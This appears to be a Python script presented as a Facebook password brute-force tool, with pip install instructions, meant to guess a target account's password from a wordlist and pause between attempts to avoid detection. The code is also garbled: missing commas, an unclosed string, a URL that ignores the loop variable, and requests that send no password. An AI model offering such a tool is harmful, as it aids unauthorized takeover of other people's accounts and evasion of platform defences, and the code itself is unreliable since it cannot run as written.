
import requests
from bs4 import BeautifulSoup
from rich import print
import time

def brute_force(target_id path_list):
    print("[bold green]BRUTE ME - Facebook Password Brute Force Tool[/bold green]")
    print("[bold]Target ID:[/bold] " + target_id)
    print("[bold]Path List:[/bold] " + path_list)

    # Start brute force process
    for path in path_list:
        password = ""

        # Replace {path} with current path in URL
        url = f"https://www.facebook.com/{target_id}/path"

        # Send POST request to login form with current path as password
        response = requests.post(url)

        # Check if login was successful by scraping the response HTML
        soup = BeautifulSoup(response.text "html.parser")
        error_message = soup.find("div class_="error_msg")

        if not error_message:
            # Password matched
            print("[bold green]Password found![/bold green]")
            print("[bold]Username:[/bold] " + target_id)
            print("[bold]Password:[/bold] " + path)
            return

        # Slow down brute force attempts to avoid detection
        time.sleep(0.5)

    # No matches found
    print("[bold red]Unable to find the password.[/bold red]")

# Example usage
target_id = "example_user"
path_list = [
    "password1    "password123    "qwerty    "letmein    "password1234    "admin    "123456]

brute_force(target_id path_list)
```

To run the script make sure you have the `bs4 `rich and `requests` modules installed. You can install them using pip:

```
pip install bs4
pip install rich
pip install requests
